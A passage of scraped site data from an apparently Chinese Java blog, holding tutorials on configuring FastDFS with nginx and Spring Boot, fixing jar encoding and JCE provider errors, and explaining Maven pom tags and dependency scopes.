/etc/fdfs/client.conf\n#需要修改的内容如下\nbase_path=/home/moe/dfs\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\n# 保存退出\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 配置 nginx 访问\n\nvim /etc/fdfs/mod_fastdfs.conf\n#需要修改的内容如下\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#配置nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#添加如下配置\nserver {\n    listen       8888;    ## 该端口为storage.conf中的http.server_port相同\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 集成 springboot\n\n\n# 引入依赖\n\n<dependency>\n    <groupid>com.github.tobato</groupid>\n    <artifactid>fastdfs-client</artifactid>\n    <version>1.26.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# 添加配置\n\nfdfs:\n  # 连接的超时时间\n  connect-timeout: 3000\n  # 读取的超时时间\n  so-timeout: 3000\n  #tracker服务所在的ip地址和端口号\n  tracker-list: 10.240.3x.xx2:22122\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# controller\n\n@restcontroller\n@requestmapping("/img")\npublic class imgcontroller {\n\n    @autowired\n    private imgserver imgserver;\n\n    @postmapping("/push")\n    public responsedata push(@requestparam("file") multipartfile file){\n        return imgserver.push(file);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 实现\n\n@service\n@slf4j\npublic class imgserverimpl implements imgserver {\n    @autowired\n    fastfilestorageclient fastfilestorageclient;\n\n    @override\n    public responsedata<string> push(multipartfile file) {\n        if (file.isempty()) {\n            return responsedata.failureresponse(uploadfilecode.upload_file_code_1000);\n        }\n        try {\n            log.info("开始上传 {}", file.getoriginalfilename());\n            string filesuffix = file.getoriginalfilename().substring(file.getoriginalfilename().lastindexof(".")+1);\n            storepath storepath = fastfilestorageclient.uploadfile(file.getinputstream(), file.getsize(),filesuffix, null);\n            string path = storepath.getfullpath();\n            log.info("上传成功");\n            return responsedata.successresponse(path);\n        } catch (ioexception e) {\n            log.error(e.tostring(), e);\n            return responsedata.failureresponse(uploadfilecode.upload_file_code_1001.getcode(), e.tostring());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n',charsets:{cjk:!0}},{title:"Spring Boot VUE前后端加解密",frontmatter:{title:"Spring Boot VUE前后端加解密",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/207/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/207.Spring%20Boot%20VUE%E5%89%8D%E5%90%8E%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86.html",relativePath:"00.java/20.Spring/23.springboot/207.Spring Boot VUE前后端加解密.md",key:"v-90a50632",path:"/spring/spring-boot/207/",headers:[{level:2,title:"Malformed UTF-8 data",slug:"malformed-utf-8-data",normalizedTitle:"malformed utf-8 data",charIndex:2},{level:2,title:"ecurityException: JCE cannot authenticate the provider BC",slug:"ecurityexception-jce-cannot-authenticate-the-provider-bc",normalizedTitle:"ecurityexception: jce cannot authenticate the provider bc",charIndex:309}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"Malformed UTF-8 data ecurityException: JCE cannot authenticate the provider BC",content:'# Malformed UTF-8 data\n\n整个问题还是比较奇怪的，在 idea 运行的时候没有问题，把前端打包的文件放到后端整合并打成 jar 包后就出现了，找到一篇文档说是启动 jar 的时候加入 -Dfile.encoding=UTF-8 即可\n\njava "-Dfile.encoding=UTF-8" -jar tool-boot-0.0.1-SNAPSHOT.jar\n\n\n1\n\n\n但如果你是 tomcat，需要在 catalina.bat 中设置\n\nset "JAVA_OPTS=%JAVA_OPTS% %LOGGING_CONFIG% -Dfile.encoding=UTF-8"\n\n\n1\n\n\n\n# ecurityException: JCE cannot authenticate the provider BC\n\n出现这里错误是由于 jdk 验签问题，oracle 的 jdk 大部分人再用，但是现在更推荐 openjdk，换成 openjdk 就不会再出现这类问题',normalizedContent:'# malformed utf-8 data\n\n整个问题还是比较奇怪的，在 idea 运行的时候没有问题，把前端打包的文件放到后端整合并打成 jar 包后就出现了，找到一篇文档说是启动 jar 的时候加入 -dfile.encoding=utf-8 即可\n\njava "-dfile.encoding=utf-8" -jar tool-boot-0.0.1-snapshot.jar\n\n\n1\n\n\n但如果你是 tomcat，需要在 catalina.bat 中设置\n\nset "java_opts=%java_opts% %logging_config% -dfile.encoding=utf-8"\n\n\n1\n\n\n\n# ecurityexception: jce cannot authenticate the provider bc\n\n出现这里错误是由于 jdk 验签问题，oracle 的 jdk 大部分人再用，但是现在更推荐 openjdk，换成 openjdk 就不会再出现这类问题',charsets:{cjk:!0}},{title:"pom 文件介绍及 parent、properties 标签详解",frontmatter:{title:"pom 文件介绍及 parent、properties 标签详解",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2300/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/2300.maven/2300.pom%20%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D%E5%8F%8A%20parent%E3%80%81properties%20%E6%A0%87%E7%AD%BE%E8%AF%A6%E8%A7%A3.html",relativePath:"00.java/2300.maven/2300.pom 文件介绍及 parent、properties 标签详解.md",key:"v-4452e22a",path:"/maven/2300/",headers:[{level:2,title:"pom.xml 介绍",slug:"pom-xml-介绍",normalizedTitle:"pom.xml 介绍",charIndex:2},{level:2,title:"parent 标签详解",slug:"parent-标签详解",normalizedTitle:"parent 标签详解",charIndex:4061},{level:2,title:"properties 标签详解",slug:"properties-标签详解",normalizedTitle:"properties 标签详解",charIndex:4813}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"pom.xml 介绍 parent 标签详解 properties 标签详解",content:'# pom.xml 介绍\n\npom 作为项目对象模型。通过 xml 表示 maven 项目，使用 pom.xml 来实现。主要描述了项目：包括配置文件；开发者需要遵循的规则，缺陷管理系统，组织和 licenses，项目的 url，项目的依赖性，以及其他所有的项目相关因素。\n\npom 中的描述信息都是用 xml 标签的方式，其中包含双标签和单标签，最顶部用于描述 xml 得版本和编码，其次是以 project 开头得双标签并表示为一个项目，定义了该项目可用内容及规范。\n\n# 双标签\n<project></project>\n\n# 单标签\n<project/>\n\n\n1\n2\n3\n4\n5\n\n\n对于 pom 可用内容较多，一级标签有如下表所示，但常用的都会有对应的描述\n\n标签                       描述\nmodelVersion             当前模型使用的版本\nparent                   继承某个 pom，部分是不可继承的\ngroupId                  公司或组织着唯一标识，如 org.springframework.boot 第一段是域（org、com\n                         非盈利组织、商业组织），第二段是公司名称，第三段是应用名称\nartifactId               项目的唯一 ID\nversion                  项目所属的版本号\nname                     项目名称\ndescription              项目描述信息\nproperties               配置信息描述，更多的是描述依赖 jar 版本、项目版本等\ndependencies             所要依赖的 jar 都需要在这里描述\nbuild                    构建信息，包括插件，资源文件信息等\nprofiles                 作用于项目环境的切换（dev、test、produce）\npackaging                描述项目的类型，可选 pom、jar、war\nrepositories             用是用来配置 maven 项目的远程仓库，可以是私服（nexus）\nmodules                  用来配置子项目\ndependencyManagement     用来提供了一种管理依赖版本号的方式。通常会在项目的最顶层的父 POM 中看到该元素。使用 pom.xml 中的\n                         dependencyManagement 元素能让所有在子项目中引用一个依赖而不用显式的列出版本号\ndistributionManagement   用于分发构件到远程仓库；mvn install 会将项目生成的构件安装到本地 Maven 仓库，mvn deploy\n                         用来将项目生成的构件分发到远程 Maven 仓库。本地 Maven 仓库的构件只能供当前用户使用，在分发到远程\n                         Maven 仓库之后，所有能访问该仓库的用户都能使用你的构件。\npluginRepositories       配置 Maven 从什么地方下载插件\nscm                      集成了软件配置管理的，他可以支持我们常用 SVN、CVS 等\ndevelopers               配置开发者信息，例如：一个开发者可以有多个 roles，properties\nissueManagement          bug 跟踪管理系统，定义 defect tracking system 缺陷跟踪系统\nreporting                包含 site 生成阶段的一些元素，某些 maven plugin 可以生成 reports 并且在 reporting\n                         下配置\nurl                      开发团队的网站，无关紧要可选\nlicenses                 许可证信息配置\norganization             配置组织信息\nciManagement             ?\ncontributors             ?\ninceptionYear            ?\nmailingLists             ?\nprerequisites            ?\nreports                  ?\n\n以一个 spring boot 常规项目做为示例：\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n    \x3c!-- 继承spring-boot使用他的相关依赖 --\x3e\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.6.9</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n    \x3c!-- 组织，应用 --\x3e\n    <groupId>com.xxx.boot</groupId>\n    \x3c!-- 项目ID，一般都喜欢是名称 --\x3e\n    <artifactId>framework</artifactId>\n    \x3c!-- 版本 --\x3e\n    <version>0.0.1-SNAPSHOT</version>\n    \x3c!-- 项目名称 --\x3e\n    <name>newFramework</name>\n    <description>Demo project for Spring Boot</description>\n    \x3c!-- 配置描述 --\x3e\n    <properties>\n        \x3c!-- java版本，但这个实际没什么用，单做一种描述信息看 --\x3e\n        <java.version>17</java.version>\n        \x3c!-- 实际指定编译版本可以使用如下 --\x3e\n        <maven.complier.source>17</maven.complier.source>\n        <maven.complier.target>17</maven.complier.target>\n    </properties>\n    \n    \x3c!-- 依赖 --\x3e\n    <dependencies>\n        \x3c!-- 具体依赖 --\x3e\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    \x3c!-- 构建信息 --\x3e\n    <build>\n        \x3c!-- 插件 --\x3e\n        <plugins>\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# parent 标签详解\n\n<parent></parent> 标签用于继承父项目的各类依赖及其他配置信息，如版本，构建信息，配置描述等，具体范围包括：\n\n# 可以继承部分\ngroupId、version、description、url、inceptionYear、organization、licenses、developers、contributors、mailingLists、scm、issueManagement、ciManagement、properties、dependencyManagement、dependencies、repositories、pluginRepositories、build、reporting、profiles\n\n# 不可继承部分\nartifactId、name、prerequisites\n\n\n1\n2\n3\n4\n5\n\n\n一个 parent 里所包含全部内容有：\n\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.6.9</version>\n    <relativePath/>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n<relativePath/> 元素，它可以单标签也可以是双标签 <relativePath>../my-parent</relativePath> 。它不是必需的，但可以用作 Maven 的指示符，然后先搜索该项目的父级的给定路径，然后再搜索本地和远程存储库，单标签为默认从当前 pom.xml 的父级目录查找。\n\n\n# properties 标签详解\n\n<properties></properties> 没有提供什么实质性的内容供我们使用，检查下来在里面最多可以在描述一个 <project></project> 标签可用，但作用并不是不大。实际作用更多在于描述我们依赖 jar 的版本等。\n\n<properties>\n    \x3c!-- java版本，但这个实际没什么用，单做一种描述信息看 --\x3e\n    <java.version>17</java.version>\n    \x3c!-- 实际指定编译版本可以使用如下 --\x3e\n    <maven.complier.source>17</maven.complier.source>\n    <maven.complier.target>17</maven.complier.target>\n    \x3c!-- 定义lombok版本 --\x3e\n    <lombok.version>1.18.24</lombok.version>\n    <project.version>0.0.1-SNAPSHOT</project.version>\n</properties>\n\x3c!-- 项目版本 --\x3e\n<version>${project.version}</version>\n\x3c!-- 依赖 --\x3e\n<dependencies>\n    <dependency>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n        <version>${lombok.version}</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# pom.xml 介绍\n\npom 作为项目对象模型。通过 xml 表示 maven 项目，使用 pom.xml 来实现。主要描述了项目：包括配置文件；开发者需要遵循的规则，缺陷管理系统，组织和 licenses，项目的 url，项目的依赖性，以及其他所有的项目相关因素。\n\npom 中的描述信息都是用 xml 标签的方式，其中包含双标签和单标签，最顶部用于描述 xml 得版本和编码，其次是以 project 开头得双标签并表示为一个项目，定义了该项目可用内容及规范。\n\n# 双标签\n<project></project>\n\n# 单标签\n<project/>\n\n\n1\n2\n3\n4\n5\n\n\n对于 pom 可用内容较多，一级标签有如下表所示，但常用的都会有对应的描述\n\n标签                       描述\nmodelversion             当前模型使用的版本\nparent                   继承某个 pom，部分是不可继承的\ngroupid                  公司或组织着唯一标识，如 org.springframework.boot 第一段是域（org、com\n                         非盈利组织、商业组织），第二段是公司名称，第三段是应用名称\nartifactid               项目的唯一 id\nversion                  项目所属的版本号\nname                     项目名称\ndescription              项目描述信息\nproperties               配置信息描述，更多的是描述依赖 jar 版本、项目版本等\ndependencies             所要依赖的 jar 都需要在这里描述\nbuild                    构建信息，包括插件，资源文件信息等\nprofiles                 作用于项目环境的切换（dev、test、produce）\npackaging                描述项目的类型，可选 pom、jar、war\nrepositories             用是用来配置 maven 项目的远程仓库，可以是私服（nexus）\nmodules                  用来配置子项目\ndependencymanagement     用来提供了一种管理依赖版本号的方式。通常会在项目的最顶层的父 pom 中看到该元素。使用 pom.xml 中的\n                         dependencymanagement 元素能让所有在子项目中引用一个依赖而不用显式的列出版本号\ndistributionmanagement   用于分发构件到远程仓库；mvn install 会将项目生成的构件安装到本地 maven 仓库，mvn deploy\n                         用来将项目生成的构件分发到远程 maven 仓库。本地 maven 仓库的构件只能供当前用户使用，在分发到远程\n                         maven 仓库之后，所有能访问该仓库的用户都能使用你的构件。\npluginrepositories       配置 maven 从什么地方下载插件\nscm                      集成了软件配置管理的，他可以支持我们常用 svn、cvs 等\ndevelopers               配置开发者信息，例如：一个开发者可以有多个 roles，properties\nissuemanagement          bug 跟踪管理系统，定义 defect tracking system 缺陷跟踪系统\nreporting                包含 site 生成阶段的一些元素，某些 maven plugin 可以生成 reports 并且在 reporting\n                         下配置\nurl                      开发团队的网站，无关紧要可选\nlicenses                 许可证信息配置\norganization             配置组织信息\ncimanagement             ?\ncontributors             ?\ninceptionyear            ?\nmailinglists             ?\nprerequisites            ?\nreports                  ?\n\n以一个 spring boot 常规项目做为示例：\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n    \x3c!-- 继承spring-boot使用他的相关依赖 --\x3e\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.6.9</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n    \x3c!-- 组织，应用 --\x3e\n    <groupid>com.xxx.boot</groupid>\n    \x3c!-- 项目id，一般都喜欢是名称 --\x3e\n    <artifactid>framework</artifactid>\n    \x3c!-- 版本 --\x3e\n    <version>0.0.1-snapshot</version>\n    \x3c!-- 项目名称 --\x3e\n    <name>newframework</name>\n    <description>demo project for spring boot</description>\n    \x3c!-- 配置描述 --\x3e\n    <properties>\n        \x3c!-- java版本，但这个实际没什么用，单做一种描述信息看 --\x3e\n        <java.version>17</java.version>\n        \x3c!-- 实际指定编译版本可以使用如下 --\x3e\n        <maven.complier.source>17</maven.complier.source>\n        <maven.complier.target>17</maven.complier.target>\n    </properties>\n    \n    \x3c!-- 依赖 --\x3e\n    <dependencies>\n        \x3c!-- 具体依赖 --\x3e\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-test</artifactid>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    \x3c!-- 构建信息 --\x3e\n    <build>\n        \x3c!-- 插件 --\x3e\n        <plugins>\n            <plugin>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-maven-plugin</artifactid>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# parent 标签详解\n\n<parent></parent> 标签用于继承父项目的各类依赖及其他配置信息，如版本，构建信息，配置描述等，具体范围包括：\n\n# 可以继承部分\ngroupid、version、description、url、inceptionyear、organization、licenses、developers、contributors、mailinglists、scm、issuemanagement、cimanagement、properties、dependencymanagement、dependencies、repositories、pluginrepositories、build、reporting、profiles\n\n# 不可继承部分\nartifactid、name、prerequisites\n\n\n1\n2\n3\n4\n5\n\n\n一个 parent 里所包含全部内容有：\n\n<parent>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <version>2.6.9</version>\n    <relativepath/>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n<relativepath/> 元素，它可以单标签也可以是双标签 <relativepath>../my-parent</relativepath> 。它不是必需的，但可以用作 maven 的指示符，然后先搜索该项目的父级的给定路径，然后再搜索本地和远程存储库，单标签为默认从当前 pom.xml 的父级目录查找。\n\n\n# properties 标签详解\n\n<properties></properties> 没有提供什么实质性的内容供我们使用，检查下来在里面最多可以在描述一个 <project></project> 标签可用，但作用并不是不大。实际作用更多在于描述我们依赖 jar 的版本等。\n\n<properties>\n    \x3c!-- java版本，但这个实际没什么用，单做一种描述信息看 --\x3e\n    <java.version>17</java.version>\n    \x3c!-- 实际指定编译版本可以使用如下 --\x3e\n    <maven.complier.source>17</maven.complier.source>\n    <maven.complier.target>17</maven.complier.target>\n    \x3c!-- 定义lombok版本 --\x3e\n    <lombok.version>1.18.24</lombok.version>\n    <project.version>0.0.1-snapshot</project.version>\n</properties>\n\x3c!-- 项目版本 --\x3e\n<version>${project.version}</version>\n\x3c!-- 依赖 --\x3e\n<dependencies>\n    <dependency>\n        <groupid>org.projectlombok</groupid>\n        <artifactid>lombok</artifactid>\n        <version>${lombok.version}</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"dependencies 标签详解",frontmatter:{title:"dependencies 标签详解",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2301/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/2300.maven/2301.dependencies%20%E6%A0%87%E7%AD%BE%E8%AF%A6%E8%A7%A3.html",relativePath:"00.java/2300.maven/2301.dependencies 标签详解.md",key:"v-13c2056a",path:"/maven/2301/",headers:[{level:2,title:"scop",slug:"scop",normalizedTitle:"scop",charIndex:320},{level:2,title:"optional",slug:"optional",normalizedTitle:"optional",charIndex:3888},{level:2,title:"exclusions",slug:"exclusions",normalizedTitle:"exclusions",charIndex:4485}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"scop optional exclusions",content:'dependencies 标签下只会有一个 dependency，dependency 作用于我们引用哪些 jar 来给我们提供更多的技术支持。一般用法:\n\n    <dependencies>\n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-pool2</artifactId>\n            <version>2.7.0</version>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# scop\n\n控制 dependency (依赖) 的使用范围。通俗的讲，就是控制 Jar 包在哪些范围被加载和使用。使用方式如下：\n\n<dependency>\n    <groupId>com.giant</groupId>\n    <artifactId>giant-core-security</artifactId>\n    <version>1.0-SNAPSHOT</version>\n    <scope>compile</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\nscop 一共有 6 个值可以使用：\n\n * compile（默认值）\n   如果没有指定 scope 值，该元素的默认值为 compile。被依赖（giant-core-securit）jar 需要参与到当前项目的编译，测试，打包，运行等阶段。打包的时候通常会包含被依赖（giant-core-securit）jar。\n\n * provided\n   被依赖 jar 理论上可以参与编译、测试、运行等阶段，相当于 compile，但是在打包阶段做了 exclude（排除） 的动作。例如， 如果我们在开发一个应用，在编译时我们需要依赖 xxxx.jar，但是在运行时我们不需要该 jar 包，因为这个 jar 包已由应用服务器或项目本身提供该依赖，此时我们需要使用 provided 进行范围修饰。\n\n * runtime\n   表示被依赖 jar 无需参与项目的编译阶段，但是会参与到项目的测试和运行阶段。与 compile 相比，被依赖 jar 无需参与项目的编译。适用场景：例如，在编译的时候我们不需要 JDBC API 的 jar 包，而在运行的时候我们才需要 JDBC 驱动包。\n\n * test\n   表示被依赖项目仅仅参与测试相关的工作，包括测试代码的编译，执行。适用场景：例如，Junit 测试。\n\n * system\n   system 元素与 provided 元素类似，但是被依赖 jar 不会从 maven 仓库中查找，而是从本地系统中获取，systemPath 元素用于制定本地系统中 jar 文件的路径。例如：\n\n<dependency>\n    <groupId>sleepycat</groupId>\n    <artifactId>je</artifactId>\n    <version>7.0.6</version>\n    <scope>system</scope>\n    <systemPath>${project.basedir}/lib/je-7.0.6.jar</systemPath>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * import\n   它只使用在 <dependencyManagement> 中，表示从其它的 pom 中导入 dependency 的配置，例如（B 项目导入 A 项目中的包配置）。众所周知，当我们创建一个 SpringBoot 项目时，我们一定会写一个 <parent> 来继承 spring 所提供的所有依赖，但如果我又想使用 spring 提供的依赖，又想继承我自己的项目，此时 import 就有了用武之地\n\n# 普通 SpringBoot 依赖\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.2.6.RELEASE</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.giant</groupId>\n    <artifactId>station</artifactId>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n</project>\n\n## 更换继承项目，并使用springboot 依赖\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    \x3c!-- 变为我自己的父项目 --\x3e\n    <parent>\n        <groupId>com.giant.parent</groupId>\n        <artifactId>boot-parent</artifactId>\n        <version>1.0-SNAPSHOT</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.giant</groupId>\n    <artifactId>station</artifactId>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n    \x3c!-- spring boot 依赖 --\x3e\n    <dependencyManagement>\n        <dependencies>\n            <dependency>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-parent</artifactId>\n                <version>2.2.6.RELEASE</version>\n                \x3c!-- 需要指明时pom还是jar --\x3e\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# optional\n\noptional 是 maven 依赖 jar 时的一个选项，表示该依赖是可选的，不会被依赖传递。例如：B 依赖了日志框架 logback、log4j、apache commons log，这时候 A 引用 B 的 jar，因为 maven 有依赖传递机制，那么 A 项目就会有 3 个 jar 包，logback、log4j、apache commons log。实际上我们一般只会在项目中使用一种日志框架，那么我们项目中就会有多余的依赖，当这种情况时越来越多时，最后整个项目的 jar 包就有很多的多余依赖，导致项目很臃肿。\n\n对于这种情况，我们只要在 B 项目中把 logback、log4j、apache commons log 设置成 <optional>true</optional> 的即可。这时候 A 项目依赖 B 的时候，项目中不会有 logback、log4j、apache commons log 相关 jar 包，可以根据情况自行选择一个即可。\n\n<dependency>\n    <groupId>org.projectlombok</groupId>\n    <artifactId>lombok</artifactId>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# exclusions\n\n用于排除依赖项中，不需要添加的 jar，或者使用自己版本的 jar 而不适用其他人所提供的 jar。如：引用的 spring-boot-starter-data-redis 会帮我们依赖 slf4j-api，但它使用的版本被爆出了 bug，那我要升级到更高版本，引入自己选中的版本。\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-redis</artifactId>\n    <version>2.2.6.RELEASE</version>\n    <exclusions>\n        \x3c!-- 排除spring-boot-starter-data-redis自带的 slf4j --\x3e\n        <exclusion>\n            <groupId>org.slf4j</groupId>\n            <artifactId>slf4j-api</artifactId>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\x3c!-- 引用更改版本的slf4j --\x3e\n<dependency>\n    <groupId>org.slf4j</groupId>\n    <artifactId>slf4j-api</artifactId>\n    <version>1.7.36</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'dependencies 标签下只会有一个 dependency，dependency 作用于我们引用哪些 jar 来给我们提供更多的技术支持。一般用法:\n\n    <dependencies>\n        <dependency>\n            <groupid>org.apache.commons</groupid>\n            <artifactid>commons-pool2</artifactid>\n            <version>2.7.0</version>\n        </dependency>\n    </dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# scop\n\n控制 dependency (依赖) 的使用范围。通俗的讲，就是控制 jar 包在哪些范围被加载和使用。使用方式如下：\n\n<dependency>\n    <groupid>com.giant</groupid>\n    <artifactid>giant-core-security</artifactid>\n    <version>1.0-snapshot</version>\n    <scope>compile</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\nscop 一共有 6 个值可以使用：\n\n * compile（默认值）\n   如果没有指定 scope 值，该元素的默认值为 compile。被依赖（giant-core-securit）jar 需要参与到当前项目的编译，测试，打包，运行等阶段。打包的时候通常会包含被依赖（giant-core-securit）jar。\n\n * provided\n   被依赖 jar 理论上可以参与编译、测试、运行等阶段，相当于 compile，但是在打包阶段做了 exclude（排除） 的动作。例如， 如果我们在开发一个应用，在编译时我们需要依赖 xxxx.jar，但是在运行时我们不需要该 jar 包，因为这个 jar 包已由应用服务器或项目本身提供该依赖，此时我们需要使用 provided 进行范围修饰。\n\n * runtime\n   表示被依赖 jar 无需参与项目的编译阶段，但是会参与到项目的测试和运行阶段。与 compile 相比，被依赖 jar 无需参与项目的编译。适用场景：例如，在编译的时候我们不需要 jdbc api 的 jar 包，而在运行的时候我们才需要 jdbc 驱动包。\n\n * test\n   表示被依赖项目仅仅参与测试相关的工作，包括测试代码的编译，执行。适用场景：例如，junit 测试。\n\n * system\n   system 元素与 provided 元素类似，但是被依赖 jar 不会从 maven 仓库中查找，而是从本地系统中获取，systempath 元素用于制定本地系统中 jar 文件的路径。例如：\n\n<dependency>\n    <groupid>sleepycat</groupid>\n    <artifactid>je</artifactid>\n    <version>7.0.6</version>\n    <scope>system</scope>\n    <systempath>${project.basedir}/lib/je-7.0.6.jar</systempath>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * 